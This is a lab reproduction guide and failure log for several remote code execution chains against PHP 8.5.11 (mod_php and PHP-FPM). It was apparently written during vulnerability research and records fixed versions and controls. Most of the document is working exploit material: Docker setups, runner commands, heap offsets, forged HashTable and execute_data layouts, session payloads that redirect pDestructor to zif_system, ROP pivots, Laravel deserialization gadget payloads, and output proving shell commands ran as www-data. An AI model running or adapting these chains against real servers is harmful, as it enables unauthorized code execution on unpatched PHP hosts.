# php2shell RCE paths — reproduction and failure log

Lab-only reproduction guide for the php2shell RCE paths on PHP 8.5.11. Fixed in
8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 (`31c0ea7d7ff`, "Avoid state corruption via
bailout"). Run only against systems you own or are authorized to test.

This file is the map: every end-to-end path, the exact container setup and
commands, the proof file, and every path that was tried and stopped. The
research log (`progress.md`), the chain notes (`README.md`, `off_chain/README.md`,
`FPM_RCE.md`, `fpm/README.md`) and the handoff (`HANDOFF.md`) remain the
detailed references.

## Status legend

| Status | Meaning |
|---|---|
| validated | End-to-end proof (`uid=33(www-data)`) in this lab, HTTP-only or documented debugger-assisted. |
| gdb-only | The trigger is HTTP-only, but the control-flow hijack needs a debugger write or fixed ASLR-off addresses. Not a remote exploit. |
| blocked | Crash or primitive reached, but no code execution. |
| excluded | Application or configuration conditions; not the php2shell memory bug. |
| fixed-control | The same chain against 8.5.12, used to confirm the fix. |

## Path map

| # | Path | Target | Preconditions | Proof | Status |
|---|---|---|---|---|---|
| A | mod_php 8.5.11, `display_errors=On` | `php:8.5.11-apache` | `display_errors=On`, `output_buffering=0`, one persistent worker | `out/p1` | validated (6/6; re-run) |
| B | mod_php 8.5.11, `display_errors=Off` | `php:8.5.11-apache` | stock `php.ini-production`, one persistent worker or pinned prefork | `/tmp/off_proof` | validated (3/3; re-run; 10-child 9-pin re-run) |
| B2 | mod_php 8.5.11, pivot + `popen` ROP | same as B | same as B; `STAGE3=stage3_rop.php` | `/tmp/rop_proof` | validated on 10 pinned children |
| C | PHP-FPM 8.5.11, native no-gdb | `php:8.5.11-fpm` | ASLR on, stock production ini, one worker (or 4 workers / 3 pins) | `/tmp/fpm5_proof` | validated (3/3; 5/5 multi; re-run) |
| C2 | PHP-FPM 8.5.11, data-only `popen` ROP pivot (no forged `execute_data`) | `php:8.5.11-fpm` / `p2s-fpm-gdb:8511` | ASLR on, stock production ini, one worker; `bash fpm/run_rop_pivot.sh` | `/tmp/fpm_rop_proof` | validated (7/7; re-run). See `ROP_PIVOT.md` |
| D | PHP-FPM 8.5.11, session-decode type confusion | `php:8.5.11-fpm` / `p2s-fpm-gdb:8511` | ASLR off (`setarch -R`), one worker | `/tmp/fpmx_proof` | **not reproducible from committed artifacts on a clean image; needs per-build re-derivation** (see note) |
| E | path1 multipart partial bucket | `php:8.5.11-apache` | ASLR off, gdb writes the fake block | `/tmp/p1hash` | gdb-only (re-run) |
| F | FPM auxiliary app/config RCEs | `php:8.5.11-fpm` | preloaded class or serialize-handler mismatch; application gadget | `/tmp/preproof*` | excluded from php2shell; 8.5.11 verified, 8.5.12 blocked (pre-RINIT) |
| Barm | mod_php 8.5.11 on aarch64, `display_errors=Off` | `php:8.5.11-apache` (arm64) | stock production ini, one persistent worker; ASLR on | `/tmp/off_proof` | validated (4/5; clean image). Offsets in `PORTING.md` |
| Carm | PHP-FPM 8.5.11 on aarch64, native leak-based | `php:8.5.11-fpm` (arm64) | stock production ini, one worker; leak supplies bases | `/tmp/fpm5_proof` | validated (3/3; clean image). `run_native_arm.sh`; offsets in `PORTING.md` |

The first four are the production-relevant results: A and B are mod_php, C is
FPM with ASLR on, D is the FPM type-confusion chain under `setarch -R`. E is a
lab RCE that still needs gdb. F is real code execution but with application or
configuration preconditions, so it is not counted as a php2shell exploit.

## Common prerequisites

| Item | Value |
|---|---|
| Work dir | `~/php2shell` |
| Repo | `iliaal/php2shell` (private) |
| Host tools | Docker, PHP CLI (64-bit), Python 3, curl, `docker cp`, `docker exec` |
| Vulnerable images | `php:8.5.11-apache`, `php:8.5.11-fpm` |
| Lab images | `p2s-path1-gdb` (apache + gdb), `p2s-fpm-gdb:8511` (fpm + gdb) |
| Fixed controls | `php:8.5.12-apache`, `php:8.5.12-fpm` |
| Network | `p2s-fpm-net` for the FPM paths |
| Ports | 8089 (A), 8091 (B), 8093 (B pinned / E), 9001 (F), 9002 (nginx), 9003 (FastCGI) |
| Proofs | `out/p1`, `/tmp/off_proof`, `/tmp/rop_proof`, `/tmp/fpm5_proof`, `/tmp/fpmx_proof`, `/tmp/p1hash` |

`out/` must be writable by uid 33. If the on-chain run prints `done` but
`out/p1` is empty, run `chmod 777 out` and re-run (observed in this pass).

Every path except F uses the target's `/tmp`, which is writable by www-data.
B2 and D kill the worker after the command; the proof file is the success
criterion, not a following request.

---

## Path A — mod_php 8.5.11, `display_errors=On`

The full four-request chain (A1 -> B1 -> A2 -> B2) described in `README.md`.
It needs `display_errors=On` and `output_buffering=0` so the A1 warning reaches
the output layer and sets `SG(headers_sent)`.

### Setup

```bash
cd ~/php2shell
chmod 777 out

docker rm -f p2s-8511 2>/dev/null || true
docker run -d --name p2s-8511 \
  -p 127.0.0.1:8089:8089 \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/out:/out" \
  -v "$PWD/lab/php.ini:/usr/local/etc/php/php.ini:ro" \
  php:8.5.11-apache

docker cp lab/httpd.conf p2s-8511:/tmp/httpd.conf
docker exec -d p2s-8511 /usr/sbin/apache2 -f /tmp/httpd.conf -X
sleep 1
curl -s http://127.0.0.1:8089/        # OK
```

`lab/httpd.conf` is the single-process prefork config on port 8089 with
`MaxRequestWorkers 1`. The target page `www/index.php` is only `echo "OK\n";`.

### Run

```bash
php -d memory_limit=-1 chain.php 8089 'id>/out/p1'
cat out/p1
```

`chain.php` builds A1, B1, A2 and B2, parses the B1 leak, computes the ASLR
addresses, and fires B2. It needs `memory_limit=-1` because the A1 body contains
a 130 MB field.

Reference output:

```text
[1/4] A1 headers_sent
      status=HTTP/1.1 200 OK
[2/4] B1 leak
      libphp=0x754a09800000 main=0x754a07c00000 S=0x754a07cf5398 zif=0x754a09d996e0
[3/4] A2 cheap OOM
[4/4] B2 fake ref + fake HashTable
done in 2.20s: id>/out/p1
$ cat out/p1
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Stages

- A1: a warning (`max_input_vars`) reaches the response, sets
  `SG(headers_sent)`; the session cookie send fails, `send_cookie` stays 1,
  `php_session_initialize()` aborts and closes the valid `ps_files`
  (`PS(mod_data)=NULL`). The 130 MB field then OOMs; the bailout skips the
  session RSHUTDOWN and leaves a dangling `PS(id)`.
- B1: the END callback initializes with `mod_data==NULL`; the forged
  `zend_string` reclaims the stale id and `php_url_encode()` reads 0x158000
  bytes into `Set-Cookie`. `main` and `libphp` are parsed from the cookie.
- A2: the first file part runs `php_session_track_init()`, which creates
  `PS(http_session_vars)` as an `IS_REFERENCE`; `s_read()` fails, then the
  nested fields OOM. The reference survives into the next request.
- B2: two 384-byte sprays overwrite the stale reference (`ptr=S`) and the stale
  id (`ptr=0`); the fake HashTable at `S` has `pDestructor = zif_system` and a
  forged `execute_data`; `zif_system` runs the command.

### Offsets (this build)

| Object | Value |
|---|---|
| `zval_ptr_dtor` | `libphp + 0x7b47a0` |
| `zif_system` | `libphp + 0x5996e0` |
| dangling `PS(id)` | `main + 0xa7000` |
| stale session reference | `main + 0x7a720` |
| fake HashTable `S` | `main + 0xF5398` |

### Fixed control

`php:8.5.12-apache` with the same ini and container: B1 returns no forged
cookie after retries; no heap/libphp disclosure, no RCE. `README.md` section 8.

---

## Path B — mod_php 8.5.11, `display_errors=Off`

The production-posture chain: stock `php.ini-production` (byte-identical copy in
`lab/php-off.ini`), no display of errors, 128M limit, 8M `post_max_size`. The
exploit is pure HTTP; no target-side files, no gdb, no app code.

### Setup

```bash
cd ~/php2shell
docker rm -f p2s-8511-off 2>/dev/null || true
docker run -d --name p2s-8511-off \
  -p 127.0.0.1:8091:8091 \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/lab/php-off.ini:/usr/local/etc/php/php.ini:ro" \
  php:8.5.11-apache

docker cp lab/httpd-off.conf p2s-8511-off:/tmp/httpd.conf
docker exec -d p2s-8511-off apache2 -f /tmp/httpd.conf -X
sleep 1
```

`lab/httpd-off.conf` is the single-process config on port 8091. On a stock
prefork target, use the pinning variant below instead of `-X`.

### Run (single worker)

```bash
CONTAINER=p2s-8511-off ./off_chain/run_off_chain.sh 8091 /tmp/off_proof
```

`CONTAINER` makes the runner read the proof through `docker exec` and remove a
stale `/tmp/off_proof` before B2. Without `CONTAINER`, the proof path is checked
on the local filesystem.

Expected:

```text
[1/4] A1: send_cookie=1 + stale PS(id) at page 0x137
      body=1064604 resp=222 status='HTTP/1.0 500 Internal Server Error'
[2/4] B1: forged-zend_string OOB read (main + libphp)
      main=0x713998200000 libphp=0x713999e00000
[3/4] A2: cheap OOM, dangling PS(http_session_vars)
[4/4] B2: fake reference + fake HashTable -> zif_system
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
Wed Oct 28 03:10:13 UTC 2026
```

The runner restarts nothing. A1 must return 500; if it does not, the 8091 worker
is dead. Re-run `docker exec -d p2s-8511-off apache2 -f /tmp/httpd.conf -X`
and start again. B2 kills the worker after `system()`; start a fresh worker for
each attempt.

### Run (10-child prefork, 9 pins)

The target keeps stock KeepAlive. The chain's bailout responses close their
connections, so affinity across the four requests comes from pinning all but one
child:

```bash
docker rm -f p2s-10ka 2>/dev/null || true
docker run -d --name p2s-10ka --entrypoint /usr/sbin/apache2 \
  -p 127.0.0.1:8093:8091 \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/lab/php-off.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/lab/httpd-10ka.conf:/tmp/httpd-10ka.conf:ro" \
  php:8.5.11-apache -f /tmp/httpd-10ka.conf -DFOREGROUND
sleep 1.5

CONTAINER=p2s-10ka PINS=9 ./off_chain/run_off_chain_pinned.sh 8093 /tmp/off_proof
```

Expected: `pinned 9 children on port 8093`, then the same A1/B1/A2/B2 output and
`RCE OK` / `uid=33(www-data)`.

### ROP variant (B2)

`stage3_rop.php` replaces the forged `execute_data` with a stack pivot and a
short `popen` ROP chain:

```bash
STAGE3=stage3_rop.php CONTAINER=p2s-10ka PINS=9 \
  ./off_chain/run_off_chain_pinned.sh 8093 /tmp/rop_proof
```

Expected:

```text
B2-ROP S=0x7a63adaf7398 pivot=0x7a63aaa4904e popen=0x7a63aa58bbc0
RCE OK
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Off-chain stages

- A1: `mk_a1_off.py --progress-early --progress-len=4044 --post40=1 --big=78
  --burners=19 --cttail=4000 --sid-late`, sent chunked. The early progress
  record makes the END `php_session_initialize()` run with the heap exhausted;
  the id's bin-64 page lands at 0x137. `php_url_encode()` OOMs with
  `send_cookie=1`, `mod_data` in the main chunk. The bailout skips the module
  RSHUTDOWN.
- B1: `off_b1b.php 8091 14 0x137 0xC8000 0x1018 300 0 400 0`; the 400-page
  partial forge lands on page 0x137; 300 nested arrays fill the freed tail; the
  819200-byte `Set-Cookie` leaks `zval_ptr_dtor`. `parse_leak.php` computes
  `libphp = qword - 0x7b47a0` and the dominant nearby cluster for `main`.
- A2: `cheap_oom_a.py --port 8091 --parts 880 --depth 64 --fillers 115`;
  nested empty file fields OOM after `track_init()` created the stale reference
  at `main + 0x7c720`.
- B2: `stage3_off.php`; 500 x 384-byte fake references land on the stale
  reference (`ptr=S`), 495 x 384-byte references land on `PS(id)` (`ptr=0`);
  the fake HashTable at `S = main + 0xF7398` has `pDestructor = zif_system`.

### Offsets (this build)

| Object | Value |
|---|---|
| `zval_ptr_dtor` | `libphp + 0x7b47a0` |
| `zif_system` | `libphp + 0x5996e0` |
| stale reference `hsv` | `main + 0x7c720` |
| fake HashTable `S` | `hsv + 0x7AC78` = `main + 0xF7398` |

The `S - hsv` relation is invariant across the 8.4.26 reference and this
8.5.11 build; `hsv` is request/heap dependent. If a different A1/B1 heap shifts
`hsv` by 0x2000, shift `S` by the same delta.

### Fixed control

The fix (`31c0ea7d7ff`) replaces OOM bailouts with `UnwindExit` and resets the
globals before request startup, so the A1 stale state is removed. The verified
8.5.12 control is the On-chain variant (`README.md` section 8: B1 returns no
forged cookie). The Off-chain variant was not re-tested against 8.5.12 in this
pass; it is the same primitive and is not expected to survive.

---

## Path C — PHP-FPM 8.5.11, native no-gdb (ASLR on)

The FPM counterpart of the session-decode bug. Unlike mod_php, FPM exits the
worker on a failed `php_request_startup()` (`fpm_main.c:1838-1843`), so the
mod_php startup-failure chain does not port. The FPM path instead uses the
`BG(unserialize)` lifetime bug: request A OOMs inside `session_start()` and
leaves `BG(unserialize).level = 1` with a dangling `php_unserialize_data`;
request B's upload-progress callback decodes a session before RINIT and reuses
it. The native chain adds the app-visible leak (heap + PIE) and a
fill-resident fake table, so no debugger writes are needed.

### Setup

Start the network and the nginx front end once:

```bash
cd ~/php2shell
docker network create p2s-fpm-net 2>/dev/null || true
docker rm -f p2s-nginx-8511 2>/dev/null || true
docker run -d --name p2s-nginx-8511 --network p2s-fpm-net \
  -p 127.0.0.1:9002:80 \
  -v "$PWD/fpm/nginx-8511.conf:/etc/nginx/conf.d/default.conf:ro" \
  nginx:alpine
```

The nginx config hardcodes the upstream name `p2s-fpm-8511:9000` and has
`fastcgi_request_buffering off`. The runner restarts nginx after creating the
FPM container because nginx resolves the upstream once.

Stop any container that holds host port 9003 (other FPM labs), then:

```bash
docker rm -f p2s-fpm-8511 p2s-native 2>/dev/null || true
```

### Run (single worker, ASLR on)

```bash
MODE=nogdb IMAGE=php:8.5.11-fpm SESS_MODE=nogdb bash fpm/run_native.sh
```

`run_native.sh` creates `p2s-native` on `p2s-fpm-net` with the alias
`p2s-fpm-8511`, mounts `www/` and `fpm/zz-single.conf`, and runs
`php-fpm -F -c /usr/local/etc/php/php.ini-production`. It then runs the leak
pair (A/B) and the exploit pair, rebuilds the fill for the leaked `d`, and
prints the proof.

Expected:

```text
[leak] worker pid=...
[leak] A http=500
[leak] heap=0x7c159ee5c428 pie=0x5d8e417c9777
[calc] d=... base=... zif=...
fake table + frame at fill 0x1e68, keys placed, ref_props set
[exploit] A http=500
[proof] /tmp/fpm5_proof:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Run (4-worker pool, 3 pins)

```bash
POOL_CONF=zz-multi.conf PINS=3 PRE=25500 MAX_CHILDREN=4 \
  MODE=nogdb IMAGE=php:8.5.11-fpm SESS_MODE=nogdb bash fpm/run_native.sh
```

`pin_fcgi.py` holds three workers with truncated FastCGI STDIN records; the
free worker serves the leak and exploit pairs. `PRE=25500` matches the free
worker's leak layout. The same proof is expected. Without the pins, a stock
multi-worker pool has no affinity and the chain is probabilistic.

### Mechanism

- Leak pair: A = `fpm_sess_split2.php?pre=24576&pad=1490900&hole=4096` under
  4M; B = `fcgi_split.py 9003 <sid> feffffffffffffff 0 0 0 4088 12
  /var/www/html/echo.php /tmp/leak.bin`. The `v5` body is a 12345-byte OOB
  read. The runner places a small `native_small` session for B; the
  release-image calibration in Round 36.2 used the 10-byte `p|i:12345;` file.
  `PIE base = leaked pointer - 0x7c9777`; `d = leaked heap pointer + 0x15cbd8`
  (plus a measured 0x37000 drift after a leak pair); `zif_system = PIE +
  0x60e3a0`.
- Exploit pair: A is the same OOM; B is `fcgi_split.py ... /index.php
  /tmp/native_b.out 12000 150 8170 /tmp/native_fill.bin`. The session decode's
  `var_tmp_var()` writes `(value, IS_LONG)` at attacker-chosen targets through
  the forged `d` and the E0/E2 entries.
- Frame: E0 prelude targets `d-0x30..d+0x10`; E2 targets `HT+0x10` (arData =
  `d+0xE80`), `HT+0x20` (nTableSize = 16), `HT+0x30` (pDestructor =
  `zif_system`). Five elements exist before the E2 writes, so the writes append
  to buckets 5..7 and leave the frame in buckets 0..2. The destroy at the next
  `php_session_track_init` calls `zif_system(&d+0xE80)`.
- Frame fields: bucket 0 `opline=0/call=1/h=0/key=0`; bucket 1 `Z_NEXT=1`
  (num_args); bucket 2 `h=command string`, `key=d+0x106` (low byte 6 =
  `IS_STRING`); bucket 2 value type `IS_NULL`.

### Fixed control

`IMAGE=php:8.5.12-fpm` fails at the leak stage: the 8.5.12 bailout fix removes
the priming step. The pre-RINIT decode of session objects is also blocked by
the incomplete-class mode.

### Constraints

- The target must supply the app-visible leak. The two-page lab app
  (`fpm_sess_split2.php`, `echo.php`) is that sink; a virgin `<?php echo "OK\n";`
  endpoint has none, and the native impact there is a worker crash, not RCE.
- The groom needs `memory_limit` low enough for the 1.1 MB session decode to
  OOM inside `session_start()`, and `session.upload_progress.enabled=On`
  (default). `session.upload_progress.enabled=0` removes the pre-RINIT consumer.
- The request layout fixes the reclaim address; changing the body shifts `d`
  and requires rebuilding the fill.
- The FPM worker exits on a startup failure; the trigger must fail after
  request startup succeeded.

---

## Path D — PHP-FPM 8.5.11, session-decode type confusion (`setarch -R`)

This is the original lab chain in `FPM_RCE.md`: one FPM worker, two FastCGI
requests, a 1.19 MB session decode OOM, a forged `d` in the fill, and the three
`tmp_var()` writes (`arData`, `nTableSize`, `pDestructor`). It runs under
`setarch -R` (ASLR off) with fixed addresses. `MODE=gdb` is the same chain with
the tracing probe.

> **Reproduction caveat (2026-10-28, independent clean-image re-validation).**
> The committed `sess_T` and `fillU.bin` do **not** reproduce on a freshly
> pulled official `php:8.5.11-fpm` (x86-64 and aarch64 alike). The reclaimed `d`
> drifts between image releases (`0x7ffff63b9000` baked vs `0x7ffff5f24000`
> observed, `zif` unchanged), and even with `d` corrected the fill reclaims `d`
> itself as an 8170-byte `zend_string`, clobbering `last_dtor` (`d+0x10` reads
> `0x1fea`=8170) so `var_tmp_var` SIGSEGVs with no proof. The underlying bug is
> confirmed on the same image via Path C (dynamic leak). Path D therefore needs
> a per-build re-derivation of `d` and a re-tuned fill groom; see `PORTING.md`
> ("When the memory layout changes within one architecture"). Do not cite Path D
> as reproducible-as-shipped.

### Setup

```bash
cd ~/php2shell
# if needed, build the gdb-lab image from the official 8.5.11 FPM image:
docker build -t p2s-fpm-gdb:8511 - <<'EOF'
FROM php:8.5.11-fpm
RUN apt-get update && apt-get install -y gdb procps
EOF
```

The `p2s-nginx-8511` container from Path C must exist; `run_rce_fpm.sh` exits if
it is missing and restarts it after creating the FPM container.

### Run

```bash
MODE=nogdb bash fpm/run_rce_fpm.sh
```

The default `MODE=nogdb` uses `setarch -R php-fpm -F`; no debugger. The script
copies `payload/sess_A` and `payload/sess_T`, sends the groom through nginx and
the exploit through FastCGI, and prints:

```text
RCE proof (/tmp/fpmx_proof):
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`MODE=gdb bash fpm/run_rce_fpm.sh` runs the same chain under the probe (the
`p2s-fpm-gdb:8511` image, `setarch -R gdb -q -batch -x /tmp/probe-rce.gdb --
args /usr/local/sbin/php-fpm -F`). The proof is the same; the probe is for the
trace, not a substitute for the frame.

### Mechanism

`tmp_var()` in `ext/standard/var_unserializer.c` reads a signed `used_slots`
from the entries block and returns `&data[used_slots]` after writing
`ZVAL_UNDEF` for the loop. A negative `used_slots` points before the block;
the decoder writes the parsed session value there, one `(8-byte value,
IS_LONG type)` write per variable. `d->last_dtor` advances by 16 per variable,
and a variable targeting `d+0x10` overwrites `last_dtor` with the next entries
block, restarting the target sequence.

`payload/sess_T`:

```text
a|i:<d+0x38>;      keep last valid
b|i:<E1>;          jump: last_dtor = E1
c|i:<d+0xE00>;     HT+0x10: arData = d+0xE00
d|i:256;           HT+0x20: nTableSize = 256
e|i:<zif_system>;  HT+0x30: pDestructor = zif_system
```

The last `;` makes the decode succeed; the destroy then calls
`pDestructor(&bucket0.val)`, and bucket 0's value is the forged
`execute_data`. The worker SIGSEGVs after the proof because of the forged
`execute_data`'s NULL `return_value` write and the `efree()` of the forged
`arData`; FPM respawns it.

### Fixed control

`php:8.5.12-fpm` with the same runner: the A OOM no longer bails out of the
decode; the leak stage fails; no proof.

---

## Path E — mod_php path1 multipart partial bucket (gdb-only)

Independent of sessions and upload progress: the multipart parser's
`_zend_hash_str_add_or_update_i()` increments `nNumUsed` and
`nNumOfElements` before `zend_string_init()` allocates the key. The final
long-key file part OOMs at that allocation; the bucket stays inside the count
but uninitialized. mod_php's request shutdown still destroys `$_POST` /
`$_FILES`; the teardown walks the stale bucket. FPM exits the worker on the
same startup failure, so this path is mod_php-only.

The trigger is HTTP-only. The RCE in this section is not: the fake block and
`zif_system` are written by gdb at `zend_array_destroy` under `setarch -R`.

### Build the gdb image

```bash
cd ~/php2shell
docker build -t p2s-path1-gdb - <<'EOF'
FROM php:8.5.11-apache
RUN apt-get update && apt-get install -y gdb procps
RUN cp /usr/local/etc/php/php.ini-production /usr/local/etc/php/php.ini
EOF
```

### Run

```bash
docker rm -f p2s-path1-noaslr 2>/dev/null || true
docker run -d --name p2s-path1-noaslr -p 127.0.0.1:8093:80 \
  --security-opt seccomp=unconfined \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/path1_rce/probe-pivot.gdb:/tmp/probe-pivot.gdb:ro" \
  p2s-path1-gdb \
  /bin/sh -c '. /etc/apache2/envvars; exec setarch -R gdb -q -batch \
    -x /tmp/probe-pivot.gdb --args apache2 -X'
sleep 2

docker exec p2s-path1-noaslr rm -f /tmp/p1hash
bash path1_hash/run_path1.sh 8093 /tmp/p1.bin
docker cp p2s-path1-noaslr:/tmp/p1hash /tmp/p1hash
cat /tmp/p1hash
```

Expected: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`.

`path1_hash/path1_body.py` defaults to 860 nested empty file parts, fillers,
60 big fields, 18 burners, a 4000-byte content-type tail, 20 groom fields and a
final `files[<4000-byte segment>][a]` field. `run_path1.sh` sends it with
`chunked_send.py` to the single `apache2 -X` worker.

### Pivot

`probe-pivot.gdb` stops at `zend_array_destroy` for the first one-element table,
computes `blk = arData - 0x40`, and writes:

- caller bucket at `arData`: `val.ptr = blk`, `type = IS_ARRAY`, `key = NULL`;
- fake HashTable at `blk`: `arData = blk+0x60`, `nNumUsed = 1`,
  `pDestructor = zif_system`;
- fake `execute_data` at `blk+0x60`; fake `zend_string` at `blk+0xC0`
  (length 14, command at `blk+0xD8`: `id>/tmp/p1hash`).

Then `zend_array_destroy -> pDestructor -> zif_system -> php_exec -> system`.
The arData offset from the 2 MB heap chunk is stable across ASLR runs:
`arData - chunk = 0x5d7c0`; `zif_system = libphp + 0x5996e0`.

### Why this is gdb-only

The fake block and `zif_system` are runtime addresses; the HTTP-only attempt
needs a chunk/libphp leak (the B1 leak is upload-progress based) and a
userland write to `HT+0x30`. The write failed; the leak is unavailable on a
target with upload progress disabled. The crash is HTTP-only reproducible; the
RCE is not.

---

## Path F — auxiliary FPM RCEs (application/config conditions)

These are real FPM RCEs on 8.5.11, but they need application code or a
configuration mismatch. They are not counted as php2shell memory-corruption
exploits and are excluded from the risk verdict. The commands are from
`fpm/README.md`; they were verified in the earlier lab rounds and are not
re-run in this pass.

Build `p2s-fpm-gdb:8511` as in Path D if it is absent. The lab's `www/vendor/`
tree is required by `www/preload.php`; run `composer install` in `www/` if it
is missing.

### Setup for all three

```bash
cd ~/php2shell
docker network create p2s-fpm-net 2>/dev/null || true
docker rm -f p2s-fpm p2s-nginx 2>/dev/null || true

docker run -d --name p2s-fpm --network p2s-fpm-net \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/fpm/php-preload.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/fpm/zz-single.conf:/usr/local/etc/php-fpm.d/zz-single.conf:ro" \
  p2s-fpm-gdb:8511 /usr/local/sbin/php-fpm -F

docker run -d --name p2s-nginx --network p2s-fpm-net \
  -p 127.0.0.1:9001:80 \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/fpm/nginx.conf:/etc/nginx/conf.d/default.conf:ro" \
  nginx:alpine
```

`fpm/php-preload.ini` appends `opcache.enable=1`,
`opcache.preload=/var/www/html/preload.php`, and
`opcache.preload_user=www-data` to the production ini. `www/preload.php`
eagerly loads the classes used by the gadget; `www/preload_store.php` stores an
`Evil` object in the session.

### F1 — pre-RINIT session gadget (stored object)

```bash
# populate a session with an Evil object
curl -s -c /tmp/pre.cookies -F 'cmd=id > /tmp/preproof' \
  http://127.0.0.1:9001/preload_store.php
SID=$(awk '/PHPSESSID/ {print $7}' /tmp/pre.cookies)

# the upload-progress request decodes the session before RINIT and fires __wakeup
curl -s -b "PHPSESSID=$SID" -F 'PHP_SESSION_UPLOAD_PROGRESS=x' \
  -F 'f=@/etc/hostname' http://127.0.0.1:9001/index.php

docker exec p2s-fpm cat /tmp/preproof
```

Expected: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. On 8.5.12:
no proof file; the pre-RINIT decode keeps the object incomplete.

Conditions: a preloaded class with a magic method reachable from
attacker-influenced session data (the application's POP chain), and an app that
stores such an object. The trigger is core PHP; the gadget is application code.

### F2 — handler mismatch + pre-RINIT wakeup (no app store)

The write endpoint's directory sets `session.serialize_handler=php_serialize`;
the read endpoint's directory uses `php`. The raw
`PHP_SESSION_UPLOAD_PROGRESS` value is stored verbatim; the `php` reader splits
at the `|`, unserializes `Evil`, and runs `__wakeup` in the pre-RINIT decode.
No app `session_start()` and no app store are needed. Use two workers and
`fastcgi_request_buffering off` (the `fpm/nginx.conf` setting) so the write is
held open at FILE_START and the default cleanup does not remove it:

```bash
docker rm -f p2s-fpm 2>/dev/null || true
docker run -d --name p2s-fpm --network p2s-fpm-net \
  -v "$PWD/www:/var/www/html:ro" \
  -v "$PWD/fpm/php-preload.ini:/usr/local/etc/php/php.ini:ro" \
  -v "$PWD/fpm/zz-multi.conf:/usr/local/etc/php-fpm.d/zz-single.conf:ro" \
  p2s-fpm-gdb:8511 /usr/local/sbin/php-fpm -F

python3 fpm/chain_e2.py 9001 'id > /tmp/preproof3'
docker exec p2s-fpm cat /tmp/preproof3
```

Expected: `uid=33(www-data)`. On 8.5.12: no proof; the read logs `Failed to
decode session object. Session has been destroyed`.

Conditions: a per-directory serialize-handler mismatch, a preloaded class with
a magic method, two workers and request buffering off. The attacker supplies
the serialized object through the write endpoint; the application does not need
to store it. This is the CVE-2026-109619 pre-RINIT decode, blocked by 8.5.12.

### F3 — common-framework gadget (Laravel PendingBroadcast)

The real Composer-installed `illuminate/broadcasting`, `illuminate/events`, and
`illuminate/container` classes; the magic method is Laravel's own
`PendingBroadcast::__destruct`, and the command runs in the application
listener `Evil::run`.

```bash
cd ~/php2shell/www
composer require illuminate/broadcasting illuminate/events
cd ..

php www/mk_laravel_payload.php 'id > /tmp/preproof4' > /tmp/laravel_pb.payload
python3 fpm/chain_e3.py 9001 /tmp/laravel_pb.payload
docker exec p2s-fpm cat /tmp/preproof4
```

`www/mk_laravel_payload.php` builds:

```php
$d = new Illuminate\Events\Dispatcher(new Illuminate\Container\Container());
$d->listen('*', 'Evil@run');
echo serialize(new Illuminate\Broadcasting\PendingBroadcast($d, $cmd));
```

Expected: `uid=33(www-data)`. On 8.5.12: no proof; the pre-RINIT decode keeps
the object incomplete. Conditions: the same handler mismatch and stalled write,
a preloaded class table containing the framework chain plus the application
listener. The trigger is core PHP; the final command lives in the application.

### Excluded other FPM chains

- `chain_c.py` (post-RINIT serialize-handler confusion) still runs on 8.5.12; it
  needs a per-directory handler mismatch and an application gadget class. Not a
  php2shell RCE.
- `chain_a.py` (upload-progress value + LFI include) needs an application
  include sink and `cleanup=0`; the LFI exists independently. Not a php2shell
  RCE.

---

## Failed and blocked paths

Every row was tried in the lab. "Stopped" means the path did not reach a
controlled `zif_system`/`popen`. The detailed rounds are in `progress.md`.

| Path | What was tried | Why it stopped | Status |
|---|---|---|---|
| path1 HTTP-only fake block | embed the 280-byte fake block in the groom that becomes the arData | `blk = arData - 0x40` is the 0x40-byte `zend_mm` chunk header; the fake HashTable's `pDestructor` at `blk+0x30` is outside any user-controlled payload | blocked |
| path1 groom identity | tag 20 groom values `G00`..`G19`; try 280- and 288-byte values | `blk` stayed `0xFF`; `ad` held only the caller bucket (`0x...b118`, type `0x307`); no marker; the arData is a recycled nested-array table, not a raw buffer | blocked |
| path1 E0-style partial bucket | fake table in `b0000`; 288-byte file-part value sets the partial bucket `val.ptr = big`, `type = IS_ARRAY` | the `files` array reuses the old `$_POST` arData; bucket 0 is the first `_POST` field (`0x40200258`, IS_STRING), not the file part. A log of 73,418 `zend_array_destroy` calls has no bucket 0 equal to `big`; the partial bucket only selects `val`/`type`, not `ht->pDestructor` | blocked |
| path1 upload-progress-off leak | HTTP-only RCE on a target with `session.upload_progress.enabled=0` | the B1 leak is upload-progress based; a bare endpoint has no independent pointer leak. The crash is HTTP-only, the RCE needs chunk/libphp bases | blocked |
| path1 on FPM | the partial-bucket trigger on FPM | FPM exits the worker on the failed startup (`fpm_main.c:1838-1843`); no second request consumes the stale bucket | not applicable |
| path2 `session.auto_start` | RINIT OOM after the session id is created, with upload progress off | `php_rinit_session_globals()` runs before every next request and clears `PS(id)`/`send_cookie`; the only pre-RINIT consumer in stock PHP is the upload-progress callback. At most a startup failure/DoS | blocked |
| FPM no-gdb frame (pre-Round 37) | option 1: fill-resident destructor argument; option 2: write `HT` fields after `track_init`; option 3: bucket-val fields as an `execute_data` | option 1 is impossible (`pDestructor(&p->val)`); option 2 had no post-track-init `_Set` write; option 3's `num_args`/`arg0`/type are engine-derived (`u2.extra` = `0xffffffff`). The E1 six-value layout also died in the encoder (7/8 buckets vs 5). Resolved by the E0/E2 layout in Round 37 | historical; resolved |
| FPM PS-zval fake reference | overwrite `PS(http_session_vars)` with a fake reference in the pre-RINIT callback | at the next `track_init` the zval is `IS_UNDEF`; the startup-failure path exits the worker. The stale A reference is never destroyed | blocked |
| FPM ROP pivot via teardown destroy | use `jump_fcontext` as `pDestructor`, fired by the array teardown | the upload-progress insert writes bucket 0 (the MXCSR qword) before the destroy; `ldmxcsr` #GPs at `jump_fcontext+8`. No `mov rsp,[rdi+imm]; ret` / `lea rsp,[rdi+imm]; ret` gadget in the binary | blocked (this fire point only) |
